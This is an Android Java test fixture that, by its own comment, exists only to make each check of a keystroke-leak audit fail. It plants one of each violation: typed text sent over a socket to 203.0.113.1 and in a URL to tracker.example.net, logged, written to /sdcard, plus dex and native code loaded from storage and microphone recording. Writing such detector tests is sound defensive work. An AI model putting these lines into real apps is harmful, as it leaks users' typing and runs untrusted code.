package planted;

import android.app.Activity;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;

/** Every violation the audit looks for, once. Built only by tools/leak_audit/selftest.py to prove that each check can fail. Never shipped. */
public class Planted extends Activity {
    static native int flushNative(String path);  // a native dictionary writer called from Java
    static native void registerCustomOpLibrary(String path);  // stands for OrtSession.SessionOptions.registerCustomOpLibrary (dlopen of a file)
    static native void addNnapi();                            // stands for an execution provider registration

    void leak(String typed) throws Exception {
        new Socket("203.0.113.1", 443).getOutputStream().write(typed.getBytes());              // network
        HttpURLConnection c = (HttpURLConnection) new URL("https://tracker.example.net/t?q=" + typed).openConnection();
        c.connect();
        Log.d("typed", typed);                                                                 // logcat
        System.out.println(typed);                                                              // stdout (logcat on Android)
        java.util.logging.Logger.getLogger("x").info(typed);                                   // java.util.logging
        new FileOutputStream("/sdcard/typed.txt").write(typed.getBytes());                      // plaintext file
        openFileOutput("typed.txt", MODE_PRIVATE).write(typed.getBytes());                      // writer API not on the allowlist
        new android.util.AtomicFile(new java.io.File("/sdcard/a")).startWrite();                // writer API not on the allowlist
        new DexClassLoader("/sdcard/x.dex", null, null, getClassLoader());                      // downloaded code
        android.bluetooth.BluetoothAdapter.getDefaultAdapter();                                 // radio
        new android.media.MediaRecorder().setOutputFile("/sdcard/voice.3gp");                   // microphone recorded to a file
        flushNative("/sdcard/dict");                                                            // native writer entry point
        System.load("/sdcard/libx.so");                                                         // native code from a path
        Runtime.getRuntime().loadLibrary("x");                                                  // native code by name outside the allowlist
        registerCustomOpLibrary("/sdcard/libop.so");                                            // custom operator library
        addNnapi();                                                                             // execution provider registration
    }
}
